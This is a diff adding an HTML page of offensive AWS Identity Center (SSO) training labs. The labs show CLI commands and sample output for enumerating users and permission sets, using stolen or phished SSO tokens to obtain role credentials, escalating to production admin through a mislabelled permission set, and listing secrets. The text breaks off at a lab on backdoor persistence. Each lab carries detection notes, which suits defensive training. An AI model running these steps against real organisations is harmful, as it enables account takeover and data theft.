@@ -1,0 +1,905 @@
+<!-- M11: AWS Identity Center (SSO) Attacks — Expert Tier Labs -->
+
+<div class="lab-walkthrough-content" id="M11-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Map the entire SSO landscape — enumerate Identity Center instances, permission sets, account assignments, and IdentityStore users/groups to understand who has access to what accounts across the organization.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>IAM permissions: <code>sso-admin:ListInstances</code>, <code>sso-admin:ListPermissionSets</code>, <code>sso-admin:DescribePermissionSet</code>, <code>sso-admin:ListAccountAssignments</code>, <code>sso-admin:ListAccountsForProvisionedPermissionSet</code>, <code>sso-admin:ListManagedPoliciesInPermissionSet</code></li>
+      <li>IdentityStore permissions: <code>identitystore:ListUsers</code>, <code>identitystore:ListGroups</code>, <code>identitystore:ListGroupMemberships</code></li>
+      <li>These permissions are typically held by the management account or a delegated Identity Center administrator account</li>
+      <li>AWS CLI configured with credentials that have the above permissions</li>
+      <li>Optional: <code>organizations:ListAccounts</code> to correlate account names</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List all Identity Center instances in the account to identify the SSO entry point. Most organizations have a single instance, but multi-instance setups exist in larger enterprises.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin list-instances</div>
+            <div class="terminal-output">{
+    "Instances": [
+        {
+            "InstanceArn": "arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0",
+            "IdentityStoreId": "d-9067fc8230",
+            "OwnerAccountId": "111222333444",
+            "Name": "MyOrgSSO",
+            "Status": "ACTIVE",
+            "CreatedDate": "2024-03-15T09:22:11.000Z"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> Note both the <code>InstanceArn</code> and the <code>IdentityStoreId</code> — you need the IdentityStoreId to enumerate users and groups through the separate IdentityStore API.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate users via the IdentityStore API. This reveals all SSO-managed identities including their usernames and email addresses — the human targets behind the access.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws identitystore list-users \
+    --identity-store-id d-9067fc8230</div>
+            <div class="terminal-output">{
+    "Users": [
+        {
+            "UserId": "9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7",
+            "UserName": "alice.smith@corp.com",
+            "DisplayName": "Alice Smith",
+            "Emails": [{"Value": "alice.smith@corp.com", "Type": "work", "Primary": true}]
+        },
+        {
+            "UserId": "9067fc82-80c2-8060-f2b4-c3d4e5f6a7b8",
+            "UserName": "bob.jones@corp.com",
+            "DisplayName": "Bob Jones",
+            "Emails": [{"Value": "bob.jones@corp.com", "Type": "work", "Primary": true}]
+        }
+    ]
+}</div>
+            <div class="terminal-cmd">$ # Enumerate groups
+$ aws identitystore list-groups \
+    --identity-store-id d-9067fc8230</div>
+            <div class="terminal-output">{
+    "Groups": [
+        {
+            "GroupId": "9067fc82-3041-7080-c3a1-a1b2c3d4e5f6",
+            "DisplayName": "PlatformEngineers",
+            "Description": "Platform infrastructure team"
+        },
+        {
+            "GroupId": "9067fc82-4052-8090-d4b2-b2c3d4e5f6a7",
+            "DisplayName": "SecurityTeam",
+            "Description": "Security operations and audit"
+        }
+    ]
+}</div>
+            <div class="terminal-cmd">$ # List members of a specific group
+$ aws identitystore list-group-memberships \
+    --identity-store-id d-9067fc8230 \
+    --group-id 9067fc82-3041-7080-c3a1-a1b2c3d4e5f6</div>
+            <div class="terminal-output">{
+    "GroupMemberships": [
+        {
+            "MembershipId": "9067fc82-1234-5678-abcd-ef1234567890",
+            "GroupId": "9067fc82-3041-7080-c3a1-a1b2c3d4e5f6",
+            "MemberId": {
+                "UserId": "9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7"
+            }
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate all permission sets configured in this instance. Each permission set defines a bundle of policies that can be assigned to users/groups for specific accounts.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin list-permission-sets \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0</div>
+            <div class="terminal-output">{
+    "PermissionSets": [
+        "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001",
+        "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60002",
+        "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60003",
+        "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60004"
+    ]
+}</div>
+            <div class="terminal-cmd">$ # Describe each permission set — look for long session durations and admin policies
+$ aws sso-admin describe-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001</div>
+            <div class="terminal-output">{
+    "PermissionSet": {
+        "Name": "AdministratorAccess",
+        "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001",
+        "Description": "Full admin access for platform team",
+        "SessionDuration": "PT12H",
+        "CreatedDate": "2024-03-15T10:00:00.000Z"
+    }
+}</div>
+            <div class="terminal-cmd">$ aws sso-admin list-managed-policies-in-permission-set \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001</div>
+            <div class="terminal-output">{
+    "AttachedManagedPolicies": [
+        {
+            "Name": "AdministratorAccess",
+            "Arn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">List account assignments for a specific permission set on a target account. This reveals which users and groups can assume each role in each account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin list-account-assignments \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --account-id 123456789012 \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001</div>
+            <div class="terminal-output">{
+    "AccountAssignments": [
+        {
+            "AccountId": "123456789012",
+            "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001",
+            "PrincipalType": "GROUP",
+            "PrincipalId": "9067fc82-3041-7080-c3a1-a1b2c3d4e5f6"
+        },
+        {
+            "AccountId": "123456789012",
+            "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60001",
+            "PrincipalType": "USER",
+            "PrincipalId": "9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Build a comprehensive user-to-account-to-permission matrix by iterating across all accounts and permission sets. This reveals the full blast radius of every identity.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Build access matrix across all accounts and permission sets
+$ for ps in $(aws sso-admin list-permission-sets \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --query 'PermissionSets' --output text); do
+    PS_NAME=$(aws sso-admin describe-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+        --permission-set-arn "$ps" --query 'PermissionSet.Name' --output text)
+    ACCOUNTS=$(aws sso-admin list-accounts-for-provisioned-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+        --permission-set-arn "$ps" --query 'AccountIds' --output text)
+    echo "[PermSet: $PS_NAME] Provisioned to accounts: $ACCOUNTS"
+done</div>
+            <div class="terminal-output">[PermSet: AdministratorAccess] Provisioned to accounts: 123456789012 234567890123 345678901234
+[PermSet: PowerUserAccess] Provisioned to accounts: 123456789012 234567890123
+[PermSet: ReadOnlyAccess] Provisioned to accounts: 123456789012 234567890123 345678901234 456789012345
+[PermSet: BillingAccess] Provisioned to accounts: 111222333444</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events to monitor:</strong> <code>sso:ListAccountAssignments</code>, <code>sso:ListPermissionSets</code>, <code>sso:DescribePermissionSet</code>, <code>identitystore:ListUsers</code>, <code>identitystore:ListGroups</code>, <code>identitystore:ListGroupMemberships</code></li>
+      <li>Burst enumeration of all permission sets followed by DescribePermissionSet for each is a strong signal — legitimate access reviews are typically scoped, not exhaustive</li>
+      <li>Calls to the IdentityStore API from non-IAM-Identity-Center-managed principals (e.g., a compromised workload role) should be treated as suspicious</li>
+      <li>Alert on enumeration patterns: <code>ListInstances</code> → <code>ListPermissionSets</code> (all) → <code>ListAccountsForProvisionedPermissionSet</code> (all) within a short time window</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1087.004 — Cloud Account Discovery</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1580 — Cloud Infrastructure Discovery</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">List Instances</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">IdentityStore: Users/Groups</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Permission Sets</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Account Assignments</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Access Matrix</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab is read-only enumeration — no resources are created. No cleanup is required. Revoke any IAM credentials used for testing that are no longer needed.</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Identity Center enumeration requires <code>sso-admin:*</code> permissions on the management account. Delegated admin accounts may also have partial access. The IdentityStore API uses a separate endpoint and requires the <code>IdentityStoreId</code>, not the Instance ARN.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M11-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Discover all AWS accounts and roles accessible through an SSO session token, then map every cross-account access path available to the authenticated user.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>A valid AWS SSO access token — obtained via <code>aws sso login</code>, device code phishing (M12-L01), or theft from <code>~/.aws/sso/cache/</code></li>
+      <li>The SSO portal start URL for the target organization (e.g., <code>https://myorg.awsapps.com/start</code>)</li>
+      <li>No IAM credentials required — SSO portal APIs accept the bearer token directly</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Use a captured or cached SSO access token to list all accounts the user can access. This reveals the full organizational scope visible to this identity.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso list-accounts --access-token "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."</div>
+            <div class="terminal-output">{
+    "accountList": [
+        {
+            "accountId": "123456789012",
+            "accountName": "production",
+            "emailAddress": "prod@corp.com"
+        },
+        {
+            "accountId": "234567890123",
+            "accountName": "staging",
+            "emailAddress": "staging@corp.com"
+        },
+        {
+            "accountId": "345678901234",
+            "accountName": "development",
+            "emailAddress": "dev@corp.com"
+        },
+        {
+            "accountId": "456789012345",
+            "accountName": "security-audit",
+            "emailAddress": "security@corp.com"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">For each discovered account, list the roles available. This maps which permission sets have been provisioned for the current user in each account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso list-account-roles \
+    --access-token "eyJhbGciOiJSUzI1NiIs..." \
+    --account-id 123456789012</div>
+            <div class="terminal-output">{
+    "roleList": [
+        {
+            "roleName": "AdministratorAccess",
+            "accountId": "123456789012"
+        },
+        {
+            "roleName": "PowerUserAccess",
+            "accountId": "123456789012"
+        },
+        {
+            "roleName": "ReadOnlyAccess",
+            "accountId": "123456789012"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Obtain temporary credentials for the highest-privilege role in the target account. These are standard STS credentials usable with any AWS SDK or CLI.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso get-role-credentials \
+    --role-name AdministratorAccess \
+    --account-id 123456789012 \
+    --access-token "eyJhbGciOiJSUzI1NiIs..."</div>
+            <div class="terminal-output">{
+    "roleCredentials": {
+        "accessKeyId": "ASIAIOSFODNN7EXAMPLE",
+        "secretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+        "sessionToken": "FwoGZXIvYXdzEBYaDH7v8G...(truncated)",
+        "expiration": 1711987200000
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Automate the full enumeration across every account and role combination to build a complete access map.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ TOKEN="eyJhbGciOiJSUzI1NiIs..."
+$ for acct in $(aws sso list-accounts --access-token "$TOKEN" \
+    --query 'accountList[*].accountId' --output text); do
+    ACCT_NAME=$(aws sso list-accounts --access-token "$TOKEN" \
+        --query "accountList[?accountId=='$acct'].accountName" --output text)
+    ROLES=$(aws sso list-account-roles --access-token "$TOKEN" \
+        --account-id "$acct" --query 'roleList[*].roleName' --output text)
+    echo "[$acct] $ACCT_NAME: $ROLES"
+done</div>
+            <div class="terminal-output">[123456789012] production: AdministratorAccess PowerUserAccess ReadOnlyAccess
+[234567890123] staging: AdministratorAccess ReadOnlyAccess
+[345678901234] development: AdministratorAccess PowerUserAccess ReadOnlyAccess
+[456789012345] security-audit: ReadOnlyAccess</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Identify overprivileged assignments — a developer with AdministratorAccess across production, staging, and dev accounts is a critical finding.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== OVERPRIVILEGED ASSIGNMENT FINDINGS ==="
+$ echo ""
+$ echo "[CRITICAL] User has AdministratorAccess in 3/4 accounts"
+$ echo "  - production (123456789012): AdministratorAccess"
+$ echo "  - staging    (234567890123): AdministratorAccess"
+$ echo "  - development(345678901234): AdministratorAccess"
+$ echo ""
+$ echo "[HIGH] Same user has admin in both prod and non-prod"
+$ echo "  Lateral movement: dev -> staging -> production"</div>
+            <div class="terminal-output">=== OVERPRIVILEGED ASSIGNMENT FINDINGS ===
+
+[CRITICAL] User has AdministratorAccess in 3/4 accounts
+  - production (123456789012): AdministratorAccess
+  - staging    (234567890123): AdministratorAccess
+  - development(345678901234): AdministratorAccess
+
+[HIGH] Same user has admin in both prod and non-prod
+  Lateral movement: dev -> staging -> production</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events:</strong> <code>sso:ListAccounts</code>, <code>sso:ListAccountRoles</code>, <code>sso:GetRoleCredentials</code></li>
+      <li>These calls log under the <code>sso.amazonaws.com</code> event source — not <code>sts</code></li>
+      <li>Alert on <code>GetRoleCredentials</code> calls for accounts outside the user's normal working set</li>
+      <li>Correlate source IP for SSO portal calls — a developer's token used from a cloud VM is anomalous</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1087.004 — Cloud Account Discovery</span>
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1550.001 — Use Alternate Authentication Material: Application Access Token</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">SSO Token</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">list-accounts</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">list-account-roles</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">get-role-credentials</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Account Access</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab uses an existing SSO token for read-only enumeration. No resources are created. Revoke the test SSO session by logging out from the portal or waiting for expiry (<code>aws sso logout</code>).</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> SSO access tokens are typically valid for 8 hours. The <code>sso:ListAccounts</code> and <code>sso:ListAccountRoles</code> APIs use the bearer token directly — no IAM permissions required.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M11-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Abuse misconfigured permission sets to escalate from a low-privilege SSO user to cross-account administrator access by discovering a mislabeled permission set whose name does not reflect its actual policy.
+  </div>
+
+  <div class="lab-disclaimer">
+    <i class="fa-solid fa-triangle-exclamation"></i>
+    <strong>Authorized Testing Only.</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
+  </div>
+
+  <div class="lab-prereqs">
+    <div class="prereq-title"><i class="fa-solid fa-list-check"></i> Prerequisites</div>
+    <ul>
+      <li>A valid SSO access token for a low-privilege user assigned to the misconfigured permission set</li>
+      <li>Alternatively: <code>sso-admin:ListPermissionSets</code> + <code>sso-admin:ListManagedPoliciesInPermissionSet</code> to discover the misconfiguration</li>
+      <li>The target organization's Identity Center instance ARN</li>
+      <li>Lab scenario: the "DevOpsAccess" permission set has been incorrectly configured with <code>AdministratorAccess</code> instead of a scoped DevOps policy</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate the policies attached to each permission set, identifying any that carry AdministratorAccess or overly broad inline policies despite having a non-admin name.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Check managed policies for each permission set
+$ for ps in $(aws sso-admin list-permission-sets \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --query 'PermissionSets' --output text); do
+    PS_NAME=$(aws sso-admin describe-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+        --permission-set-arn "$ps" --query 'PermissionSet.Name' --output text)
+    POLICIES=$(aws sso-admin list-managed-policies-in-permission-set \
+        --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+        --permission-set-arn "$ps" --query 'AttachedManagedPolicies[*].Name' --output text)
+    echo "[$PS_NAME] Policies: $POLICIES"
+done</div>
+            <div class="terminal-output">[AdministratorAccess] Policies: AdministratorAccess
+[PowerUserAccess] Policies: PowerUserAccess
+[ReadOnlyAccess] Policies: ReadOnlyAccess
+[DevOpsAccess] Policies: AdministratorAccess    &lt;-- MISCONFIGURED: named "DevOps" but has full Admin</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Use <code>list-account-assignments-for-principal</code> to find all accounts where the current user's principal has assignments. This API returns the full assignment list across all accounts for a single principal — critical for understanding your own blast radius.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso-admin list-account-assignments-for-principal \
+    --instance-arn arn:aws:sso:::instance/ssoins-72234a38bcd9e1a0 \
+    --principal-id 9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7 \
+    --principal-type USER</div>
+            <div class="terminal-output">{
+    "AccountAssignments": [
+        {
+            "AccountId": "345678901234",
+            "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60004",
+            "PrincipalId": "9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7",
+            "PrincipalType": "USER"
+        },
+        {
+            "AccountId": "123456789012",
+            "PermissionSetArn": "arn:aws:sso:::permissionSet/ssoins-72234a38bcd9e1a0/ps-a1b2c3d4e5f60004",
+            "PrincipalId": "9067fc82-70b1-7050-e1a3-b2c3d4e5f6a7",
+            "PrincipalType": "USER"
+        }
+    ]
+}
+# Both use ps-...0004 = "DevOpsAccess" which has AdministratorAccess policy!</div>
+          </div>
+        </div>
+        <div class="step-note"><i class="fa-solid fa-lightbulb"></i> The <code>--principal-type</code> flag accepts <code>USER</code> or <code>GROUP</code>. Run the same command with <code>GROUP</code> and the group IDs you discovered in the IdentityStore enumeration to find group-based assignments.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Obtain administrator credentials in the target production account by leveraging the misconfigured "DevOpsAccess" permission set.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws sso get-role-credentials \
+    --role-name DevOpsAccess \
+    --account-id 123456789012 \
+    --access-token "eyJhbGciOiJSUzI1NiIs..."</div>
+            <div class="terminal-output">{
+    "roleCredentials": {
+        "accessKeyId": "ASIAIOSFODNN7PRODKEY",
+        "secretAccessKey": "wJalrXUtnFEMI/K7MDENG/PRODEXAMPLEKEY",
+        "sessionToken": "FwoGZXIvYXdzEBYaDH7v8G...(truncated)",
+        "expiration": 1711987200000
+    }
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Verify that the credentials grant full administrator access in the target production account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7PRODKEY"
+$ export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/PRODEXAMPLEKEY"
+$ export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDH7v8G..."
+$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23COLMEXAMP:attacker@corp.com",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/AWSReservedSSO_DevOpsAccess_a1b2c3d4e5f6/attacker@corp.com"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate production resources with admin privileges — S3 buckets, databases, secrets, and other high-value targets.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws s3 ls</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-financial-reports
+2024-03-01 09:11:44 prod-application-logs
+2024-03-20 16:55:33 prod-backups-encrypted</div>
+            <div class="terminal-cmd">$ aws secretsmanager list-secrets --query 'SecretList[*].Name'</div>
+            <div class="terminal-output">[
+    "prod/database/master-credentials",
+    "prod/api/stripe-secret-key",
+    "prod/app/jwt-signing-key"
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="lab-detection">
+    <div class="detection-title"><i class="fa-solid fa-magnifying-glass"></i> Detection Notes</div>
+    <ul>
+      <li><strong>CloudTrail events:</strong> <code>sso:ListAccountAssignments</code>, <code>sso:GetRoleCredentials</code> for high-privilege roles, <code>sso-admin:ListManagedPoliciesInPermissionSet</code></li>
+      <li>Alert on <code>GetRoleCredentials</code> for <code>AdministratorAccess</code>-equivalent roles where the calling user's normal role is scoped (e.g., DevOps user obtaining admin creds)</li>
+      <li>Periodically audit permission set names vs. their actual attached policies — naming/policy divergence is the root cause here</li>
+    </ul>
+  </div>
+
+  <div class="lab-mitre">
+    <div class="mitre-title"><i class="fa-solid fa-shield-halved"></i> MITRE ATT&amp;CK Mappings</div>
+    <div class="mitre-tags">
+      <span class="mitre-tag">T1078.004 — Valid Accounts: Cloud Accounts</span>
+      <span class="mitre-tag">T1087.004 — Cloud Account Discovery</span>
+      <span class="mitre-tag">T1068 — Exploitation for Privilege Escalation</span>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Enumerate PermSets</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Find Misconfig</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Get Admin Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Prod Account Admin</div>
+    </div>
+  </div>
+
+  <div class="lab-cleanup">
+    <div class="cleanup-title"><i class="fa-solid fa-broom"></i> Cleanup</div>
+    <p>This lab is read-only exploitation of existing misconfiguration. To remediate in a real engagement: correct the permission set's attached policy to match its intended scope (e.g., replace <code>AdministratorAccess</code> with a scoped DevOps policy). Unset the exported environment variables with <code>unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN</code>.</p>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> A single overprivileged permission set can compromise the entire organization. Always audit permission set names against their actual attached policies — naming discrepancies are a common misconfiguration.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M11-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Establish persistent access across the organization by creating a backdoor Identity Center permission set with an innocuous name but admin-level privileges, then assigning it to an attacker-controlled SSO user.
+  </div>
+
